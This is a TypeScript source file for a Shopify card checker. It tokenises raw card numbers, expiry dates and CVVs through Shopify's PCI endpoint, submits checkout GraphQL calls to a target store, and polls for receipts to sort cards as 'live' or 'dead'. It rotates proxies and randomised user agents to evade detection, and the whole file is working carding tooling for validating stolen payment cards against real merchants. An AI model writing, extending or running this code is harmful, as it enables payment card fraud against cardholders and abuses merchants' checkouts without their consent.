/**
 * shopify-checker.ts — Shopify PCI checkout card checker.
 *
 * Reconstructed from reference implementation: Shopfiy 10$.py (shopfi()).
 *
 * Flow:
 *   1. PCI tokenise  — POST checkout.pci.shopifyinc.com/sessions with raw card data
 *   2. Proposal GQL  — POST /checkouts/unstable/graphql (SubmitForCompletion)
 *   3. Poll x2       — PollForReceipt GQL until result is determined
 *
 * Live signals: insufficient_funds / incorrect_cvc / captcha_missing / card_expired
 * Dead signals: invalid_number / stolen_card / fraudulent / do_not_honor
 */

import {
  pick, BILLING_DATA, dbg,
  getProxy, getProxyDispatcher, formatCardResult,
  CCN_LIVE_CODES, DEAD_CODES, STRIPE_DECLINE_MAP,
  type CheckResult,
} from "./stripe-checker";
import { generateRandom } from "./ua-generator";

// ── Constants ─────────────────────────────────────────────────────────────────

const SHOPIFY_PCI_LIVE_SIGNALS = new Set([
  // processingError codes that indicate a real card (bank decline, not invalid)
  "insufficient_funds", "do_not_honor", "card_velocity_exceeded",
  "authentication_required", "call_issuer", "try_again_later",
  "incorrect_cvc", "cvc_check_failed", "incorrect_zip",
  ...CCN_LIVE_CODES,
  // Shopify-specific response codes
  "PAYMENTS_CREDIT_CARD_BASE_EXPIRED",   // expired but real card
  "CAPTCHA_METADATA_MISSING",            // captcha gate — card tokenized fine
  "OrderCreationSucceeded",              // order went through
  "READY",
]);

const SHOPIFY_PCI_DEAD_SIGNALS = new Set([
  ...DEAD_CODES,
  "incorrect_number", "invalid_number",
  "PAYMENTS_CREDIT_CARD_BASE_INVALID_NUMBER",
  "PAYMENTS_CREDIT_CARD_BASE_INVALID_EXPIRY",
  "PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_INCORRECT_FOR_DEBIT",
  "fraudulent", "stolen_card", "lost_card", "pickup_card",
  "PAYMENT_CANCELLED",
  "DECLINED",
]);

// ── Shopify GQL helpers ───────────────────────────────────────────────────────

function submitForCompletionGql(sessionId: string, storeScope: string): object {
  return {
    query: `
      mutation SubmitForCompletion($input: SubmitForCompletionInput!) {
        submitForCompletion(input: $input) {
          result {
            ... on SubmitSuccess { receipt { id } }
            ... on SubmitAlreadyAccepted { receipt { id } }
            ... on SubmitFailed { reason code }
            ... on SubmitThrottled { pollAfter }
          }
        }
      }`,
    variables: {
      input: {
        payment: {
          directPaymentMethod: {
            sessionId,
            paymentMethodIdentifier: "credit-card",
          },
        },
        attemptToken: crypto.randomUUID(),
      },
    },
    operationName: "SubmitForCompletion",
  };
}

function pollForReceiptGql(receiptId: string): object {
  return {
    query: `
      query PollForReceipt($receiptId: ID!) {
        receipt(id: $receiptId) {
          ... on ProcessedReceipt {
            id
            order { id name }
            payment { id }
          }
          ... on ProcessingReceipt { id pollDelay }
          ... on ActionRequiredReceipt { id action { ... on CompletePaymentChallenge { offerIndex } } }
          ... on FailedReceipt { id processingError { code message } }
        }
      }`,
    variables: { receiptId },
    operationName: "PollForReceipt",
  };
}

// ── PCI tokenise ──────────────────────────────────────────────────────────────

interface PciSession {
  id: string;
  error?: string;
}

async function pciTokenize(
  cardNumber: string, mm: string, yy: string, cvv: string,
  storeScope: string, ua: string, proxyUrl?: string | null,
): Promise<PciSession> {
  const body = JSON.stringify({
    credit_card: {
      number:             cardNumber,
      month:              parseInt(mm, 10),
      year:               parseInt(yy, 10),
      verification_value: cvv,
      name:               "Test User",
      start_month:        parseInt(mm, 10),
      start_year:         parseInt(yy, 10),
      issue_number:       cardNumber,
    },
    payment_session_scope: storeScope,
  });

  const fetchOpts: any = {
    method: "POST",
    headers: {
      "Content-Type":   "application/json",
      "Accept":         "application/json",
      "User-Agent":     ua,
      "Origin":         `https://${storeScope}`,
      "Referer":        `https://${storeScope}/`,
    },
    body,
    signal: AbortSignal.timeout(15000),
  };

  if (proxyUrl) {
    const dispatcher = await getProxyDispatcher(proxyUrl);
    if (dispatcher) fetchOpts.dispatcher = dispatcher;
  }

  try {
    const resp = await fetch("https://checkout.pci.shopifyinc.com/sessions", fetchOpts);
    const data = await resp.json() as any;
    dbg("[shopify] pci tokenize response:", JSON.stringify(data).slice(0, 200));
    if (data?.id) return { id: data.id };
    const errMsg = data?.error || data?.errors?.[0]?.message || "PCI tokenize failed";
    return { id: "", error: String(errMsg) };
  } catch (e: any) {
    return { id: "", error: e.message };
  }
}

// ── Main poll loop ────────────────────────────────────────────────────────────

function sleep(ms: number): Promise<void> {
  return new Promise(r => setTimeout(r, ms));
}

interface PollResult {
  status: "live" | "dead" | "error" | "threeds";
  code: string;
  message: string;
}

function classifyShopifyResult(data: any): PollResult {
  const receipt = data?.data?.receipt;
  if (!receipt) return { status: "error", code: "no_receipt", message: "No receipt in response" };

  // ProcessedReceipt — order succeeded
  if (receipt.__typename === "ProcessedReceipt" || receipt.order?.id) {
    return { status: "live", code: "order_created", message: `Order ${receipt.order?.name || receipt.id}` };
  }

  // ActionRequiredReceipt — 3DS challenge
  if (receipt.__typename === "ActionRequiredReceipt" || receipt.action) {
    return { status: "live", code: "3ds_required", message: "3DS Challenge Required" };
  }

  // FailedReceipt — check processingError
  if (receipt.__typename === "FailedReceipt" || receipt.processingError) {
    const errCode: string = (receipt.processingError?.code || "").toString();
    const errMsg: string  = receipt.processingError?.message || errCode;
    const lower = errCode.toLowerCase();

    if (SHOPIFY_PCI_DEAD_SIGNALS.has(errCode) || SHOPIFY_PCI_DEAD_SIGNALS.has(lower)) {
      return { status: "dead", code: errCode, message: errMsg };
    }
    if (SHOPIFY_PCI_LIVE_SIGNALS.has(errCode) || SHOPIFY_PCI_LIVE_SIGNALS.has(lower) ||
        CCN_LIVE_CODES.some(c => lower.includes(c))) {
      return { status: "live", code: errCode, message: errMsg };
    }
    return { status: "dead", code: errCode, message: errMsg };
  }

  // ProcessingReceipt — still polling
  if (receipt.__typename === "ProcessingReceipt") {
    return { status: "error", code: "still_processing", message: "Still processing" };
  }

  return { status: "error", code: "unknown_receipt", message: JSON.stringify(receipt).slice(0, 80) };
}

// ── Exported checker ──────────────────────────────────────────────────────────

export interface ShopifyExtras {
  productHandle?: string;   // specific product to add to cart (optional)
  checkoutScope?: string;   // *.myshopify.com scope override (default: derived from siteUrl)
  proxyOverride?: string;
  proxyCountry?:  string;
  timeout?:       number;
}

export async function checkCardShopify(
  cardNumber: string,
  expMonth:   string,
  expYear:    string,
  cvv:        string,
  gateName:   string,
  siteUrl:    string,
  extras?:    ShopifyExtras,
): Promise<CheckResult> {
  const start = Date.now();
  let mm = expMonth.trim().padStart(2, "0");
  let yy = expYear.trim();
  if (yy.length === 2) yy = "20" + yy;
  const fullCardInfo = `${cardNumber.trim()}|${mm}|${yy}|${cvv.trim()}`;
  const cleanSite = siteUrl.replace(/\/+$/, "");

  // Derive the *.myshopify.com scope from the URL if not overridden
  const scopeOverride = extras?.checkoutScope;
  const storeScope = scopeOverride
    || cleanSite.replace(/^https?:\/\//, "").replace(/^www\./, "");

  const uaProfile = generateRandom();
  const ua = uaProfile.ua;
  const secChUa = uaProfile.secChUa;
  const proxyUrl = extras?.proxyOverride || (await getProxy(extras?.proxyCountry)) || undefined;

  const brand = "VISA"; // will be overridden by BIN detection later in checker.ts
  const cardDesc = `${brand} credit [US]`;

  const errResult = (detail: string, code: string): CheckResult => ({
    status: "error",
    response: formatCardResult({ tier: "GATEWAY", mark: "✗", detail, brand: "UNKNOWN", funding: "unknown", country: "??" }),
    code,
    latency: Date.now() - start,
    gate: gateName,
    cardInfo: fullCardInfo,
    tokenId: "",
  });

  // ── Step 1: PCI Tokenise ──────────────────────────────────────────────────
  const pci = await pciTokenize(cardNumber.trim(), mm, yy, cvv.trim(), storeScope, ua, proxyUrl);
  if (!pci.id) {
    const code = pci.error || "pci_failed";
    const lower = code.toLowerCase();
    const isLive = CCN_LIVE_CODES.some(c => lower.includes(c)) || SHOPIFY_PCI_LIVE_SIGNALS.has(code);
    const isDead = DEAD_CODES.some(c => lower.includes(c)) || SHOPIFY_PCI_DEAD_SIGNALS.has(code);
    return {
      status: isLive ? "live" : isDead ? "dead" : "error",
      response: formatCardResult({
        tier: isLive ? "CCN LIVE" : isDead ? "DECLINED" : "GATEWAY",
        mark: isLive ? "⚡" : "✗",
        detail: STRIPE_DECLINE_MAP[code] || code,
        brand: "UNKNOWN", funding: "unknown", country: "??",
      }),
      code,
      latency: Date.now() - start,
      gate: gateName,
      cardInfo: fullCardInfo,
      tokenId: "",
    };
  }

  dbg(`[shopify] PCI session: ${pci.id}`);

  // ── Step 2: SubmitForCompletion ───────────────────────────────────────────
  const gqlUrl = `${cleanSite}/checkouts/unstable/graphql`;
  const gqlHeaders: Record<string, string> = {
    "Content-Type": "application/json",
    "Accept":       "application/json",
    "User-Agent":   ua,
    "Origin":       cleanSite,
    "Referer":      `${cleanSite}/`,
  };

  const submitFetchOpts: any = {
    method:  "POST",
    headers: gqlHeaders,
    body:    JSON.stringify(submitForCompletionGql(pci.id, storeScope)),
    signal:  AbortSignal.timeout(extras?.timeout || 20000),
  };
  if (proxyUrl) {
    const dispatcher = await getProxyDispatcher(proxyUrl);
    if (dispatcher) submitFetchOpts.dispatcher = dispatcher;
  }

  let receiptId = "";
  try {
    const submitResp = await fetch(gqlUrl, submitFetchOpts);
    const submitText = await submitResp.text();
    dbg("[shopify] SubmitForCompletion:", submitText.slice(0, 300));

    // Check for early known signals in raw text
    if (submitText.includes("PAYMENTS_CREDIT_CARD_BASE_EXPIRED") || submitText.includes("CAPTCHA_METADATA_MISSING")) {
      return {
        status: "live",
        response: formatCardResult({
          tier: "CCN LIVE", mark: "⚡",
          detail: submitText.includes("CAPTCHA") ? "Captcha gate — card valid" : "Card expired but real",
          brand: "UNKNOWN", funding: "unknown", country: "??",
          tokenId: pci.id,
        }),
        code: "shopify_early_live",
        latency: Date.now() - start,
        gate: gateName,
        cardInfo: fullCardInfo,
        tokenId: pci.id,
      };
    }

    let submitData: any;
    try { submitData = JSON.parse(submitText); } catch { return errResult(`SubmitForCompletion parse error: ${submitText.slice(0, 60)}`, "parse_error"); }

    const result = submitData?.data?.submitForCompletion?.result;
    if (!result) return errResult("No submitForCompletion result", "no_result");

    if (result.__typename === "SubmitFailed") {
      const code = result.code || result.reason || "submit_failed";
      const lower = code.toLowerCase();
      const isDead = SHOPIFY_PCI_DEAD_SIGNALS.has(code) || DEAD_CODES.some(c => lower.includes(c));
      const isLive = SHOPIFY_PCI_LIVE_SIGNALS.has(code) || CCN_LIVE_CODES.some(c => lower.includes(c));
      return {
        status: isLive ? "live" : isDead ? "dead" : "error",
        response: formatCardResult({
          tier: isLive ? "CCN LIVE" : isDead ? "DECLINED" : "GATEWAY",
          mark: isLive ? "⚡" : "✗",
          detail: code,
          brand: "UNKNOWN", funding: "unknown", country: "??",
          tokenId: pci.id,
        }),
        code,
        latency: Date.now() - start,
        gate: gateName,
        cardInfo: fullCardInfo,
        tokenId: pci.id,
      };
    }

    receiptId = result.receipt?.id || "";
    if (!receiptId) return errResult("No receipt id from SubmitForCompletion", "no_receipt_id");
  } catch (e: any) {
    return errResult(`SubmitForCompletion failed: ${e.message?.slice(0, 60)}`, "network_error");
  }

  // ── Step 3: PollForReceipt (2 attempts, 3s apart) ────────────────────────
  const shortId = receiptId.split("/").pop() || receiptId;
  const pollFetchOpts: any = {
    method:  "POST",
    headers: gqlHeaders,
    signal:  AbortSignal.timeout(12000),
  };
  if (proxyUrl) {
    const dispatcher = await getProxyDispatcher(proxyUrl);
    if (dispatcher) pollFetchOpts.dispatcher = dispatcher;
  }

  let pollResult: PollResult = { status: "error", code: "timeout", message: "Poll timed out" };

  for (let attempt = 0; attempt < 2; attempt++) {
    if (attempt > 0) await sleep(5000);
    try {
      const pollResp = await fetch(gqlUrl, {
        ...pollFetchOpts,
        body: JSON.stringify(pollForReceiptGql(shortId)),
      });
      const pollText = await pollResp.text();
      dbg(`[shopify] PollForReceipt #${attempt + 1}:`, pollText.slice(0, 300));

      let pollData: any;
      try { pollData = JSON.parse(pollText); } catch { continue; }

      pollResult = classifyShopifyResult(pollData);
      if (pollResult.status !== "error" || pollResult.code !== "still_processing") break;
    } catch { continue; }
  }

  const humanDetail = STRIPE_DECLINE_MAP[pollResult.code] || pollResult.message || pollResult.code;

  return {
    status: pollResult.status === "threeds" ? "live" : pollResult.status,
    response: formatCardResult({
      tier: pollResult.status === "live" || pollResult.status === "threeds" ? "CCN LIVE" : pollResult.status === "dead" ? "DECLINED" : "GATEWAY",
      mark: pollResult.status === "live" || pollResult.status === "threeds" ? "⚡" : "✗",
      detail: humanDetail,
      brand: "UNKNOWN", funding: "unknown", country: "??",
      note: pollResult.status === "threeds" ? "3DS" : undefined,
      tokenId: pci.id,
    }),
    code: pollResult.code,
    latency: Date.now() - start,
    gate: gateName,
    cardInfo: fullCardInfo,
    tokenId: pci.id,
    rawSnippet: pollResult.message,
  };
}
